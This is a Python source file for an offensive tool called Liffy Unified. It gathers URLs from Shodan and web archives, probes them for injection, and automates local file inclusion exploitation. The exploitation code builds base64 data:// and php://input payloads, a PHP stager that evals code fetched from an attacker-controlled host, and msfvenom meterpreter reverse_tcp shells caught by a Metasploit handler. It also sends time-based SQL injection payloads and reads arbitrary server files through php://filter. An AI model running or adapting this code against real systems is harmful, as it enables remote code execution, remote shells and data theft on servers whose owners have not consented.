#!/usr/bin/env python3
"""
Liffy Unified - Complete LFI Exploitation Tool with URL Gathering
Integrates URL discovery, vulnerability testing, and LFI exploitation in one fast tool
"""

__author__ = 'rotlogix'
__author__ = 'unicornFurnace'
__version__ = '3.0.0'

import argparse
import sys
import os
import time
import json
import random
import subprocess
import threading
import tempfile
import shutil
from pathlib import Path
from typing import List, Dict, Optional, Any, Tuple
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import urllib.parse
from urllib.parse import urlparse, urljoin, parse_qs, quote_plus
import base64
import requests
from dataclasses import dataclass
from enum import Enum

try:
    from blessings import Terminal
    t = Terminal()
except ImportError:
    class Terminal:
        def __getattr__(self, name):
            return lambda x: x
    t = Terminal()

# Import Liffy core modules
try:
    import core
    from shell_generator import Generator
    from msf import Payload
except ImportError:
    print("Error: Core Liffy modules not found. Please ensure core.py, shell_generator.py, and msf.py are in the same directory.")
    sys.exit(1)

class SourceType(Enum):
    SHODAN = "shodan"
    GAUPLUS = "gauplus"
    WAYBACK = "wayback"
    COMMONCRAWL = "commoncrawl"
    OTX = "otx"
    MANUAL = "manual"
    RANDOM = "random"

@dataclass
class URLInfo:
    """Information about a discovered URL"""
    url: str
    source: SourceType
    domain: str
    parameters: Dict[str, List[str]]
    method: str = "GET"
    status_code: Optional[int] = None
    title: Optional[str] = None
    content_type: Optional[str] = None
    response_size: Optional[int] = None
    discovered_at: str = ""
    lfi_vulnerable: bool = False
    xss_vulnerable: bool = False
    sqli_vulnerable: bool = False

class FastURLGatherer:
    """Fast URL gathering with parallel processing"""
    
    def __init__(self, logger):
        self.logger = logger
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Tool paths
        self.sqry_path = "/home/kali/go/bin/sqry"
        self.gauplus_path = "/home/kali/go/bin/gauplus"
        self.airixss_path = "airixss"
        self.jeeves_path = "jeeves"
        self.qsreplace_path = "qsreplace"
        self.gf_path = "gf"
        
        # Ensure tools are available
        self._ensure_tools_installed()
    
    def _ensure_tools_installed(self):
        """Ensure all required tools are installed"""
        tools = {
            'sqry': self.sqry_path,
            'gauplus': self.gauplus_path,
            'airixss': self.airixss_path,
            'jeeves': self.jeeves_path,
            'qsreplace': self.qsreplace_path,
            'gf': self.gf_path
        }
        
        for tool_name, tool_path in tools.items():
            if not self._is_tool_available(tool_path):
                self.logger.warning(f"{tool_name} not found, installing...")
                self._install_tool(tool_name)
    
    def _is_tool_available(self, tool_path: str) -> bool:
        """Check if tool is available"""
        try:
            result = subprocess.run([tool_path, '--help'], capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except:
            return False
    
    def _install_tool(self, tool_name: str):
        """Install required tool"""
        install_commands = {
            'sqry': 'go install github.com/Anon-Exploiter/sqry@latest',
            'gauplus': 'go install github.com/bp0lr/gauplus@latest',
            'airixss': 'go install github.com/ferreiraklet/airixss@latest',
            'jeeves': 'go install github.com/ferreiraklet/jeeves@latest',
            'qsreplace': 'go install github.com/tomnomnom/qsreplace@latest',
            'gf': 'go install github.com/tomnomnom/gf@latest'
        }
        
        if tool_name in install_commands:
            try:
                subprocess.run(install_commands[tool_name], shell=True, capture_output=True, text=True, timeout=60)
                self.logger.info(f"{tool_name} installed successfully")
            except Exception as e:
                self.logger.error(f"Error installing {tool_name}: {str(e)}")
    
    def gather_from_shodan(self, query: str, limit: int = 100) -> List[URLInfo]:
        """Gather URLs from Shodan using sqry"""
        urls = []
        
        try:
            cmd = [self.sqry_path, "-q", query, "--json", "--limit", str(limit), "--httpx"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if line.strip():
                        try:
                            data = json.loads(line)
                            if 'ip' in data:
                                ip = data['ip']
                                ports = data.get('ports', [])
                                protocol = 'https' if 443 in ports else 'http'
                                port = 443 if 443 in ports else (80 if 80 in ports else ports[0] if ports else 80)
                                
                                if port not in [80, 443]:
                                    url = f"{protocol}://{ip}:{port}"
                                else:
                                    url = f"{protocol}://{ip}"
                                
                                url_info = URLInfo(
                                    url=url,
                                    source=SourceType.SHODAN,
                                    domain=ip,
                                    parameters={},
                                    discovered_at=time.strftime("%Y-%m-%d %H:%M:%S")
                                )
                                urls.append(url_info)
                        except json.JSONDecodeError:
                            continue
        except Exception as e:
            self.logger.error(f"Error running Shodan query: {str(e)}")
        
        return urls
    
    def gather_from_gauplus(self, domain: str, subs: bool = True, limit: int = 1000) -> List[URLInfo]:
        """Gather URLs using gauplus"""
        urls = []
        
        try:
            cmd = [self.gauplus_path, "-json", "-t", "10", "-providers", "wayback,otx,commoncrawl"]
            if subs:
                cmd.append("-subs")
            cmd.append(domain)
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    if line.strip():
                        try:
                            data = json.loads(line)
                            if 'url' in data:
                                url = data['url']
                                parsed = urlparse(url)
                                params = parse_qs(parsed.query)
                                
                                url_info = URLInfo(
                                    url=url,
                                    source=SourceType.GAUPLUS,
                                    domain=parsed.netloc,
                                    parameters=params,
                                    discovered_at=time.strftime("%Y-%m-%d %H:%M:%S")
                                )
                                urls.append(url_info)
                        except json.JSONDecodeError:
                            continue
        except Exception as e:
            self.logger.error(f"Error running gauplus: {str(e)}")
        
        return urls[:limit]
    
    def gather_random_targets(self, count: int = 5) -> List[URLInfo]:
        """Gather random targets from scope directory"""
        urls = []
        scope_dir = Path.home() / "targets" / "scope"
        
        try:
            if not scope_dir.exists():
                self.logger.error(f"Scope directory not found: {scope_dir}")
                return urls
            
            # Find scope files
            scope_files = []
            for file_path in scope_dir.rglob("*"):
                if (file_path.is_file() and 
                    file_path.suffix in ['.txt', '.md', '.json', '.csv']):
                    scope_files.append(file_path)
            
            if not scope_files:
                self.logger.error("No scope files found")
                return urls
            
            # Read all targets
            all_targets = set()
            for scope_file in scope_files:
                try:
                    with open(scope_file, 'r', encoding='utf-8') as f:
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith('#'):
                                if '://' in line:
                                    all_targets.add(line)
                                elif '.' in line and not line.startswith('*'):
                                    all_targets.add(f"http://{line}")
                                    all_targets.add(f"https://{line}")
                except Exception as e:
                    self.logger.debug(f"Error reading {scope_file}: {str(e)}")
            
            # Select random targets
            targets_list = list(all_targets)
            random.shuffle(targets_list)
            selected_targets = targets_list[:min(count, len(targets_list))]
            
            for target in selected_targets:
                try:
                    parsed = urlparse(target)
                    if parsed.netloc:
                        url_info = URLInfo(
                            url=target,
                            source=SourceType.RANDOM,
                            domain=parsed.netloc,
                            parameters={},
                            discovered_at=time.strftime("%Y-%m-%d %H:%M:%S")
                        )
                        urls.append(url_info)
                except Exception as e:
                    self.logger.debug(f"Error parsing target {target}: {str(e)}")
        
        except Exception as e:
            self.logger.error(f"Error gathering random targets: {str(e)}")
        
        return urls
    
    def analyze_url(self, url_info: URLInfo) -> URLInfo:
        """Analyze URL for potential vulnerabilities"""
        try:
            response = self.session.get(url_info.url, timeout=10, allow_redirects=True)
            url_info.status_code = response.status_code
            url_info.content_type = response.headers.get('content-type', '')
            url_info.response_size = len(response.content)
            
            # Extract title
            title_match = re.search(r'<title[^>]*>(.*?)</title>', response.text, re.IGNORECASE)
            if title_match:
                url_info.title = title_match.group(1).strip()
            
            # Check for LFI parameters
            url_info.lfi_vulnerable = self._check_lfi_parameters(url_info.parameters)
            
            # Check for XSS parameters
            url_info.xss_vulnerable = self._check_xss_parameters(url_info.parameters)
            
            # Check for SQLi parameters
            url_info.sqli_vulnerable = self._check_sqli_parameters(url_info.parameters)
            
            # If no parameters, add common test parameters
            if not url_info.parameters:
                url_info.parameters = self._get_common_test_parameters()
                url_info.lfi_vulnerable = self._check_lfi_parameters(url_info.parameters)
                url_info.xss_vulnerable = self._check_xss_parameters(url_info.parameters)
                url_info.sqli_vulnerable = self._check_sqli_parameters(url_info.parameters)
        
        except Exception as e:
            self.logger.debug(f"Error analyzing URL {url_info.url}: {str(e)}")
        
        return url_info
    
    def _check_lfi_parameters(self, parameters: Dict[str, List[str]]) -> bool:
        """Check if parameters might be vulnerable to LFI"""
        lfi_keywords = [
            'file', 'page', 'path', 'include', 'require', 'view', 'template',
            'doc', 'document', 'folder', 'dir', 'directory', 'read', 'load',
            'show', 'display', 'content', 'data', 'src', 'source'
        ]
        
        for param_name in parameters.keys():
            if any(keyword in param_name.lower() for keyword in lfi_keywords):
                return True
        
        return False
    
    def _check_xss_parameters(self, parameters: Dict[str, List[str]]) -> bool:
        """Check if parameters might be vulnerable to XSS"""
        xss_keywords = [
            'search', 'query', 'q', 'term', 'keyword', 'name', 'title',
            'description', 'comment', 'message', 'text', 'input', 'value'
        ]
        
        for param_name in parameters.keys():
            if any(keyword in param_name.lower() for keyword in xss_keywords):
                return True
        
        return False
    
    def _check_sqli_parameters(self, parameters: Dict[str, List[str]]) -> bool:
        """Check if parameters might be vulnerable to SQLi"""
        sqli_keywords = [
            'id', 'user', 'username', 'password', 'email', 'search', 'query',
            'category', 'type', 'status', 'order', 'sort', 'filter'
        ]
        
        for param_name in parameters.keys():
            if any(keyword in param_name.lower() for keyword in sqli_keywords):
                return True
        
        return False
    
    def _get_common_test_parameters(self) -> Dict[str, List[str]]:
        """Get common test parameters for vulnerability detection"""
        return {
            'file': ['test.txt'],
            'page': ['index.php'],
            'path': ['/etc/passwd'],
            'include': ['config.php'],
            'view': ['home.html'],
            'search': ['test'],
            'query': ['example'],
            'id': ['1'],
            'user': ['admin']
        }
    
    def test_xss(self, url_info: URLInfo) -> bool:
        """Test URL for XSS vulnerabilities"""
        if not url_info.xss_vulnerable:
            return False
        
        try:
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt') as f:
                f.write(url_info.url)
                temp_file = f.name
            
            cmd = [self.airixss_path, "-l", temp_file, "-o", f"/tmp/xss_results_{int(time.time())}.txt"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            os.unlink(temp_file)
            return result.returncode == 0
        except Exception as e:
            self.logger.error(f"Error testing XSS: {str(e)}")
            return False
    
    def test_sqli(self, url_info: URLInfo) -> bool:
        """Test URL for SQL injection vulnerabilities"""
        if not url_info.sqli_vulnerable:
            return False
        
        try:
            test_urls = []
            for param_name, param_values in url_info.parameters.items():
                if param_values:
                    payload = f"(select(0)from(select(sleep(5)))v)"
                    test_url = url_info.url.replace(f"{param_name}={param_values[0]}", f"{param_name}={payload}")
                    test_urls.append(test_url)
            
            for test_url in test_urls:
                start_time = time.time()
                try:
                    response = requests.get(test_url, timeout=10)
                    end_time = time.time()
                    
                    if end_time - start_time >= 4:
                        return True
                except requests.Timeout:
                    return True
        except Exception as e:
            self.logger.error(f"Error testing SQLi: {str(e)}")
        
        return False

class LiffyUnified:
    """Unified Liffy tool with URL gathering and LFI exploitation"""
    
    def __init__(self):
        self.logger = self._setup_logging()
        self.url_gatherer = FastURLGatherer(self.logger)
        self.results = []
    
    def _setup_logging(self):
        """Setup logging configuration"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('liffy_unified.log'),
                logging.StreamHandler()
            ]
        )
        return logging.getLogger(__name__)
    
    def banner(self):
        """Display banner"""
        print(t.cyan("""
    .____    .__  _____  _____
    |    |   |__|/ ____\\/ ____\\__.__.
    |    |   |  \\   __\\   __<   |  |
    |    |___|  ||  |   |  |  \\___  |
    |_______ \\__||__|   |__|  / ____| v3.0.0
        \\/                \\/
    
    🚀 Unified LFI Exploitation with URL Gathering
    =============================================
"""))
    
    def gather_urls(self, domain: str = None, shodan_query: str = None, 
                   random_targets: bool = False, random_count: int = 5,
                   limit: int = 100) -> List[URLInfo]:
        """Gather URLs from various sources"""
        all_urls = []
        
        if random_targets or (not domain and not shodan_query):
            self.logger.info("Gathering random targets from scope...")
            random_urls = self.url_gatherer.gather_random_targets(random_count)
            all_urls.extend(random_urls)
            self.logger.info(f"Found {len(random_urls)} random targets")
        
        if shodan_query:
            self.logger.info("Gathering URLs from Shodan...")
            shodan_urls = self.url_gatherer.gather_from_shodan(shodan_query, limit)
            all_urls.extend(shodan_urls)
            self.logger.info(f"Found {len(shodan_urls)} URLs from Shodan")
        
        if domain:
            self.logger.info("Gathering URLs from historical sources...")
            gauplus_urls = self.url_gatherer.gather_from_gauplus(domain, limit=limit)
            all_urls.extend(gauplus_urls)
            self.logger.info(f"Found {len(gauplus_urls)} URLs from historical sources")
        
        # Remove duplicates
        unique_urls = self._remove_duplicates(all_urls)
        self.logger.info(f"Total unique URLs: {len(unique_urls)}")
        
        return unique_urls
    
    def analyze_urls(self, urls: List[URLInfo], max_workers: int = 10) -> List[URLInfo]:
        """Analyze URLs for vulnerabilities"""
        self.logger.info(f"Analyzing {len(urls)} URLs...")
        
        analyzed_urls = []
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_url = {
                executor.submit(self.url_gatherer.analyze_url, url): url 
                for url in urls
            }
            
            for future in as_completed(future_to_url):
                try:
                    analyzed_url = future.result()
                    analyzed_urls.append(analyzed_url)
                except Exception as e:
                    self.logger.error(f"Error analyzing URL: {str(e)}")
        
        return analyzed_urls
    
    def test_vulnerabilities(self, urls: List[URLInfo]) -> List[URLInfo]:
        """Test URLs for specific vulnerabilities"""
        self.logger.info("Testing for vulnerabilities...")
        
        for url_info in urls:
            if url_info.xss_vulnerable:
                self.logger.info(f"Testing XSS for: {url_info.url}")
                url_info.xss_vulnerable = self.url_gatherer.test_xss(url_info)
            
            if url_info.sqli_vulnerable:
                self.logger.info(f"Testing SQLi for: {url_info.url}")
                url_info.sqli_vulnerable = self.url_gatherer.test_sqli(url_info)
        
        return urls
    
    def _remove_duplicates(self, urls: List[URLInfo]) -> List[URLInfo]:
        """Remove duplicate URLs"""
        seen = set()
        unique_urls = []
        
        for url_info in urls:
            if url_info.url not in seen:
                seen.add(url_info.url)
                unique_urls.append(url_info)
        
        return unique_urls
    
    def get_lfi_targets(self, urls: List[URLInfo]) -> List[URLInfo]:
        """Filter URLs that are potentially vulnerable to LFI"""
        return [url for url in urls if url.lfi_vulnerable]
    
    def run_lfi_exploitation(self, url_info: URLInfo, technique: str = "data"):
        """Run LFI exploitation on a specific URL"""
        self.logger.info(f"Running LFI exploitation on: {url_info.url}")
        
        # Extract the base URL and parameter
        parsed = urlparse(url_info.url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # Find LFI parameter
        lfi_param = None
        for param_name in url_info.parameters.keys():
            if any(keyword in param_name.lower() for keyword in ['file', 'page', 'path', 'include']):
                lfi_param = param_name
                break
        
        if not lfi_param:
            # Add a common LFI parameter
            lfi_param = 'file'
            base_url += f"?{lfi_param}="
        else:
            # Replace existing parameter value
            base_url = url_info.url.split('=')[0] + "="
        
        # Run LFI exploitation based on technique
        if technique == "data":
            self._run_data_technique(base_url)
        elif technique == "input":
            self._run_input_technique(base_url)
        elif technique == "expect":
            self._run_expect_technique(base_url)
        elif technique == "environ":
            self._run_environ_technique(base_url)
        elif technique == "filter":
            self._run_filter_technique(base_url)
        else:
            self.logger.error(f"Unknown technique: {technique}")
    
    def _run_data_technique(self, base_url: str):
        """Run data:// technique"""
        try:
            lhost, lport, shell = self._get_msf_payload()
            payload = self._get_stager_payload(lhost, shell)
            encoded_payload = quote_plus(base64.b64encode(payload.encode()).decode())
            data_wrapper = f"data://text/html;base64,{encoded_payload}"
            lfi_url = base_url + data_wrapper
            
            self._execute_lfi_attack(lfi_url, lhost, lport)
        except Exception as e:
            self.logger.error(f"Error running data technique: {str(e)}")
    
    def _run_input_technique(self, base_url: str):
        """Run php://input technique"""
        try:
            lhost, lport, shell = self._get_msf_payload()
            payload = self._get_stager_payload(lhost, shell)
            wrapper = "php://input"
            lfi_url = base_url + wrapper
            
            self._execute_lfi_attack(lfi_url, lhost, lport, method="POST", data=payload)
        except Exception as e:
            self.logger.error(f"Error running input technique: {str(e)}")
    
    def _run_expect_technique(self, base_url: str):
        """Run expect:// technique"""
        try:
            lhost, lport, shell = self._get_msf_payload()
            payload = self._get_stager_payload(lhost, shell)
            expect_payload = f"expect://echo \"{quote_plus(payload)}\" | php"
            lfi_url = base_url + expect_payload
            
            self._execute_lfi_attack(lfi_url, lhost, lport)
        except Exception as e:
            self.logger.error(f"Error running expect technique: {str(e)}")
    
    def _run_environ_technique(self, base_url: str):
        """Run /proc/self/environ technique"""
        try:
            lhost, lport, shell = self._get_msf_payload()
            payload = self._get_stager_payload(lhost, shell)
            lfi_url = base_url + "/proc/self/environ"
            
            headers = {'User-Agent': payload}
            self._execute_lfi_attack(lfi_url, lhost, lport, headers=headers)
        except Exception as e:
            self.logger.error(f"Error running environ technique: {str(e)}")
    
    def _run_filter_technique(self, base_url: str):
        """Run php://filter technique"""
        try:
            file_to_read = input("Enter file to read: ")
            filter_payload = f"php://filter/convert.base64-encode/resource={file_to_read}"
            lfi_url = base_url + filter_payload
            
            response = requests.get(lfi_url)
            if response.status_code == 200:
                try:
                    decoded = base64.b64decode(response.text)
                    print(f"Decoded content: {decoded}")
                except:
                    print(f"Raw content: {response.text}")
        except Exception as e:
            self.logger.error(f"Error running filter technique: {str(e)}")
    
    def _get_msf_payload(self):
        """Get Metasploit payload details"""
        lhost = input("Enter LHOST for callbacks: ").strip()
        lport = int(input("Enter LPORT for callbacks: ").strip())
        
        g = Generator()
        shell = g.generate()
        
        # Generate MSF payload
        php_cmd = f"/usr/bin/msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw > /tmp/{shell}.php"
        subprocess.run(php_cmd, shell=True)
        
        return lhost, lport, shell
    
    def _get_stager_payload(self, lhost: str, shell: str):
        """Get stager payload"""
        return f"<?php eval(file_get_contents('http://{lhost}:8000/{shell}.php'))?>"
    
    def _execute_lfi_attack(self, lfi_url: str, lhost: str, lport: int, 
                           method: str = "GET", data: str = None, headers: Dict = None):
        """Execute LFI attack"""
        # Start Metasploit handler
        handle = Payload(lhost, lport)
        handle.handler()
        
        # Start web server if needed
        if not data:  # Only for stager attacks
            subprocess.Popen(['python', 'http_server.py'], stdout=subprocess.PIPE)
        
        input("Press Enter when Metasploit handler is running...")
        
        # Execute attack
        try:
            if method == "POST":
                response = requests.post(lfi_url, data=data, headers=headers)
            else:
                response = requests.get(lfi_url, headers=headers)
            
            if response.status_code == 200:
                print("LFI attack executed successfully!")
            else:
                print(f"Unexpected HTTP response: {response.status_code}")
        except Exception as e:
            print(f"Error executing LFI attack: {str(e)}")
    
    def save_results(self, urls: List[URLInfo], output_file: str = None):
        """Save results to file"""
        if not output_file:
            output_file = f"liffy_results_{int(time.time())}.json"
        
        results = []
        for url_info in urls:
            results.append({
                'url': url_info.url,
                'source': url_info.source.value,
                'domain': url_info.domain,
                'parameters': url_info.parameters,
                'status_code': url_info.status_code,
                'title': url_info.title,
                'lfi_vulnerable': url_info.lfi_vulnerable,
                'xss_vulnerable': url_info.xss_vulnerable,
                'sqli_vulnerable': url_info.sqli_vulnerable,
                'discovered_at': url_info.discovered_at
            })
        
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        
        self.logger.info(f"Results saved to: {output_file}")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="Liffy Unified - Complete LFI Exploitation Tool")
    parser.add_argument("--domain", help="Target domain for URL gathering")
    parser.add_argument("--shodan-query", help="Shodan query for target discovery")
    parser.add_argument("--random", action="store_true", help="Use random targets from scope")
    parser.add_argument("--random-count", type=int, default=5, help="Number of random targets")
    parser.add_argument("--limit", type=int, default=100, help="Limit number of results")
    parser.add_argument("--technique", choices=['data', 'input', 'expect', 'environ', 'filter'], 
                       default='data', help="LFI exploitation technique")
    parser.add_argument("--test-mode", choices=['lfi', 'xss', 'sqli', 'all'], 
                       default='all', help="Vulnerability test mode")
    parser.add_argument("--output", help="Output file for results")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    
    # Create unified tool
    liffy = LiffyUnified()
    liffy.banner()
    
    # Gather URLs
    urls = liffy.gather_urls(
        domain=args.domain,
        shodan_query=args.shodan_query,
        random_targets=args.random,
        random_count=args.random_count,
        limit=args.limit
    )
    
    if not urls:
        print("No URLs found!")
        return
    
    # Analyze URLs
    analyzed_urls = liffy.analyze_urls(urls)
    
    # Test vulnerabilities
    tested_urls = liffy.test_vulnerabilities(analyzed_urls)
    
    # Filter by test mode
    if args.test_mode == 'lfi':
        target_urls = liffy.get_lfi_targets(tested_urls)
    elif args.test_mode == 'xss':
        target_urls = [url for url in tested_urls if url.xss_vulnerable]
    elif args.test_mode == 'sqli':
        target_urls = [url for url in tested_urls if url.sqli_vulnerable]
    else:
        target_urls = tested_urls
    
    # Save results
    liffy.save_results(tested_urls, args.output)
    
    # Show summary
    lfi_targets = liffy.get_lfi_targets(tested_urls)
    xss_targets = [url for url in tested_urls if url.xss_vulnerable]
    sqli_targets = [url for url in tested_urls if url.sqli_vulnerable]
    
    print(f"\n{t.green('Summary:')}")
    print(f"Total URLs: {len(tested_urls)}")
    print(f"LFI targets: {len(lfi_targets)}")
    print(f"XSS targets: {len(xss_targets)}")
    print(f"SQLi targets: {len(sqli_targets)}")
    
    # Run LFI exploitation on targets
    if lfi_targets and args.test_mode in ['lfi', 'all']:
        print(f"\n{t.yellow('LFI Targets found:')}")
        for i, target in enumerate(lfi_targets[:5]):  # Show first 5
            print(f"  {i+1}. {target.url}")
        
        if len(lfi_targets) > 0:
            choice = input(f"\nSelect target for LFI exploitation (1-{min(5, len(lfi_targets))}): ")
            try:
                target_index = int(choice) - 1
                if 0 <= target_index < min(5, len(lfi_targets)):
                    liffy.run_lfi_exploitation(lfi_targets[target_index], args.technique)
            except ValueError:
                print("Invalid choice!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{t.red('Keyboard Interrupt!')}")
        sys.exit(0)